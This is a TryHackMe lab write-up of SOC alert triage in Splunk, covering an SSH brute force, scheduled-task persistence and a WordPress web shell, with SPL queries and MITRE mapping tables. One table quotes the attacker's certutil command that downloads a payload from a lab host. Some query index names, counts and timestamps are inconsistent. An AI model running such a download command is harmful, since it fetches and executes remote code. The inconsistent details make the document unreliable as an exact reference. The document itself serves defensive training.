---
title: Alert triage with Splunk
platform: TryHackMe
difficulty: Medium
date: 2026-08-02
tags: [Triage, SIEM, Splunk]
summary: A write up using Splunk to triage alerts and investigate malicious activity
---

# Alert triage with Splunk


## Initial access alert

Scenario:
You’ve just started your first shift as a SOC analyst at an MSSP. Only a few minutes have passed since an alert about a possible brute force attack appeared on the platform.

Alert Details:

    Alert Name: Brute Force Activity Detection
    Time: 17/09/2025 9:00:21 AM
    Target Host: tryhackme-2404
    Source IP: 10.10.242.248

Your job is to investigate this activity and decide whether it should be considered suspicious.

1. Investigate target host and source IP:
index="-nuxalert" sourcetype="linux_secure" 10.10.242.248 
| search "Accepted password for" OR "Failed password for" OR "Invalid user"
| sort + _time

this query will search for both successful and failed login attempts as well as events related to invalid users, which are commonly observed wen an attacer is attempting to enumerate accounts before starting a brute force attacks on a specific user.
![splunk1](/static/images/splunk1.png)

this query brings back results that show this IP is clearly enumerating users to target for a brute force attack as there are several login attempts for non-existent users.

2. Run another search to see the number of login attempts made for each user:
index="linux-alert" sourcetype="linux_secure" 10.10.242.248
| rex field=\_raw "^\d{4}-\d{2}-\d{2}T[^\s]+\s+(?\<log_hostname>\S+)"
| rex field=\_raw "sshd\[\d+\]:\s\*(?<action>Failed|Accepted)\s+\S+\s+for(?: invalid user)? (?<username>\S+) from (?\<src_ip>\d{1,3}(?:\.\d{1,3}){3})"
| eval process=sshd""
| stats count values(src_ip) as src_ip values(log_hostname) as hostname values(process) as process by username
![splunk2](/static/images/splunk2.png)

This query shows that a staggering 503 attempts were made against john.smith which shows the brute force took place against this user once a legitimate user was found during enumeration.

3. Find out if the brute for was successful:
index="-alert" sourcetype="linux_secure" 10.10.242.248
| rex field=\_raw "^\d{4}-\d{2}-\d{2}T[^\s]+\s+(?<log_hostname>\S+)"
| rex field=\_raw "sshd\[\d+\]:\s\*(?<action>Failed|Accepted)\s+\S+\s+for(?: invalid user)? (?<username>\S+) from (?<src_ip>\d{1,3}(?:\.\d{1,3}){3})"
| eval process="sshd"
| stats count values(action) values(src_ip) as src_ip values(log_hostname) as hostname values(process) as process  by username
![splunk3](/static/images/splunk3.png)

As can be seen by the query result there was a successful login.

### Exercises

**How many failed login attempts were made on the user john.smith**
The below screenshot shows that there were 500 events related to password failure for the user john.smith
![splunk4](/statice/images/splunk4.png)

**What was the duration of the brute force attack in minutes**
The below screenshot shows the whole duration of the brute force only took 6 minutes with the first attempt starting at 9:01 am and the successful login at 9:07 am
![splunk5](/static/images/splunk5.png)

**What username was the attacker able to privilege escalate to**
searching the Linux logs for sudo at 9:11 AM the account can be seen using "sudo su" to switch to the root account
![splunk6](/statice/images/splunk6.png)

**What is the name of the user account created by the attacker for persistence**
filtering by action created and the hostname we can see there is an account and new group created at 9:12 am called system-utm that is added to etc/gshadow and /etc/group groups.
![splunk7](/static/images/splunk7.png)

Mapping table:
|time (UTC)|Tactic|Technique|ID|Evidence|
|----------|------|---------|--|--------|
|09:01-09:07|Credential Access|Brute Force: Password guessing|T1110.001|500 Failed password for john.smit|
|~09:07|Inital access|Valid Accounts:Local Accounts|T1078.003|Successful SSH auth as john.smith (uid=1001)|
|09:11:28|Privilege Escalation|Sudo and Sudo Caching|T1548.003|COMMAND=/usr/bin/su;root session opened|
09:12:10|Peristence|Create Account:Local Account|T1136.001|adduser systemutm;useradd/ groupadd to /etc/group,/etc/gshadow|

## Persistence Alert
Scenario:
You are working as a SOC Level 1 Analyst on shift at an MSSP. An alert has come through indicating that a suspicious scheduled task was created on a host.

Alert Details:

    Alert Name: Potential Task Scheduler Persistence Identified
    Time: 30/08/2025 10:06:07 AM
    Host: WIN-H015
    User: oliver.thompson
    Task Name: AssessmentTaskOne

Your job is to investigate this activity and decide whether it should be considered suspicious.

1. Focus on Host and user: What kind of host is it? workstation or server? check the Asset inventoryServers often use prefixes like SRV, WEB, MSQL. In this case it's a workstation. Next check user and if the activity fits their role, HR creating tasks is not normal but for IT staff it would be. checking user location and working hours to see if it fits is also a good first step. In this scenario the user is a System engineer.

2. Query the logs:
index="win-alert" EventCode=4698 AssessmentTaskOne
| table _time EventCode user_name host Task_Name Message

Looking at the task create shows a task that will run every day and wants to run a powershell executabel that uses certutilto download rv.exe from the tryhotme domain into the temp folder under the name Datacollector.exe, the file is then launched using a start-process powershell command and all this activity will be executed under the user oliver.thompson.
![splunk8](/static/images/splunk8.png)

### Exercises
**What is the processID of the process that created this malicious task**
querying for the task name shows that schtasks.exe started this malicious task at 10:06:07 with a PID of 5816.
![splunk9](/static/images/splunk9.png)

**what is the name of the parent process for the process that created this malicious task**
cmd.exe with a process id of 4128 is the parent process for the process that created the malicious task
![splunk10](/static/images/splunk10.png)

**Which local group did the attacker enumereate during discovery**
Since I have the terminalsessionID of the logon I'm able to search for anything that happened during the account breach, so I searched for the "localgroup" cmd command and saw they enumerated the administrators group at 9:53:49
![splunk11](/static/images/splunk11.png)

**What is the name of the workstation from which the threat actor logged into this host**
Since I have the host and username I can use the windows event i 4624 to the successful logins into the account where I can see the name of the workstation that logged in at 9:50:02
![splunk12](/static/images/splunk12.png)

Attack chain:
| Time (UTC) | Tactic | Technique | ID | Evidence |
|------------|--------|-----------|----|----------|
| 09:42:01 | Initial Access / Lateral Movement | Remote Services: RDP | T1021.001 | 4624 Type 10 RDP as oliver.thompson, LogonId 0xF824F, session 3, source DEV-QA-SERVER |
| 09:42:01 | Initial Access / Defense Evasion | Valid Accounts | T1078 | Attacker used pre-obtained oliver.thompson credentials; no brute force in attack path |
| 09:53:49 | Discovery | Permission Groups Discovery: Local Groups | T1069.001 | `net1 localgroup Administrators`, session 3 |
| 10:06:07 | Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | cmd.exe (PID 4128) spawns schtasks.exe (PID 5816) |
| 10:06:07 | Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | 4698 task `\AssessmentTaskOne` created, LogonId 0xF824F, daily @ 10:15, RunLevel LeastPrivilege |
| 10:06:07 | Defense Evasion | Masquerading | T1036 | Payload `rv.exe` saved as `DataCollector.exe`; benign task name |
| 10:15 (scheduled) | Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Task action `powershell.exe -Command "..."` |
| 10:15 (scheduled) | Command and Control | Ingress Tool Transfer | T1105 | `certutil -urlcache -f http://tryhotme:9876/rv.exe` |
| 10:15 (scheduled) | Defense Evasion | System Binary Proxy Execution: Certutil | T1218.014 | certutil (signed LOLBin) abused as file downloader |
| 10:08:16 | Session End | User-initiated logoff | - | 4647 logoff of 0xF824F; attacker closed RDP session after persistence |

## Web Shell alert 
Scenario: 
Your shift as an SOC L1 analyst continues, and you’ve now received the next alert that needs to be investigated. This time, the activity is related to the web.


Alert Details:

    Alert Name: Potential Web Shell Upload Detected
    Time: 14/09/2025 09:31:51 AM
    Resource: http://web.trywinme.thm
    Suspicious IP: 171.251.232.40

Your job is to investigate this activity and decide whether it should be considered suspicious.

1. resource where the activity occoure http://web.trywinme.thm, the orgs website hosted on the webserver and the suspicious IP checked across various threat intel platforms, in this case AbuseIPDB which shows it has been flagged over 3000 times with a confidence of abuse of 100%
![splunk13](/static/images/splunk13.png)

2. query the ip in the SIEM:
index=web-alert 171.251.232.40
| table _time clientip useragent uri_path method status 
| sort + _time

This returns over 300 events with a User-agent of Hydra a popular tool used by attackers to perform brute force attempts, in this case to the wp-login.php page.
![splunk14](/static/images/splunk14.png)

3. query the ip again in the SIEM exlcuding the hydra user-agent to filter down the results to see what else happened:
index=web-alert 171.251.232.40 useragent!="Mozilla/5.0 (Hydra)" 
| table  _time clientip useragent uri_path referer referer_domain method status

This returns only 24 events, since the alert was for a web shell this helped narrow down the event field. One event shows a POST request for admin-ajax.php with a refer pointing to theme-editor.php?file=b374k.php, the theme editor should not refrence arbitraty .php files. this suggest the attacker may have uploaded or is interacting with a web shell.
![splunk15](/static/images/splunk15.png)

4. Look at logs realted to b374k.php
index=web-alert 171.251.232.40 b374k.php
| table _time clientip useragent uri_path referer referer_domain method status
| sort + _time

![splunk16](/static/images/splunk16.png)
Here can be seen the attacker gaining access to the web shell with the GET command and then using POST for command execution

5. Investigate the file, some attackers use popular web shells without changing their names. googling the file name brings up a github repo for the web shell

![splunk17](/static/images/splunk17.png)


### Exercises

**What time did the brute-force activity using Hydra begin**
The brute-force began at 21:20:27 2025-09-14
![splunk18](/static/images/splunk18.png)

**Which user agent did the attacker use when interacting with the web shell**
![splunk19](/static/images/splunk19.png)

**What was the number of requests made by the attacker to the server via the webshell**
Four post requests are made to the web shell from 22:07:28 - 22:31:51
![splunk20](/static/images/splunk20.png)


---

- **Alert triage with splunk**
- **TryHackMe**
- **Medium**
- **2026-08-02**
- **Triage, SIEM, Splunk**
- **A write up using splunk to triage alerts and investigate malicious activity**
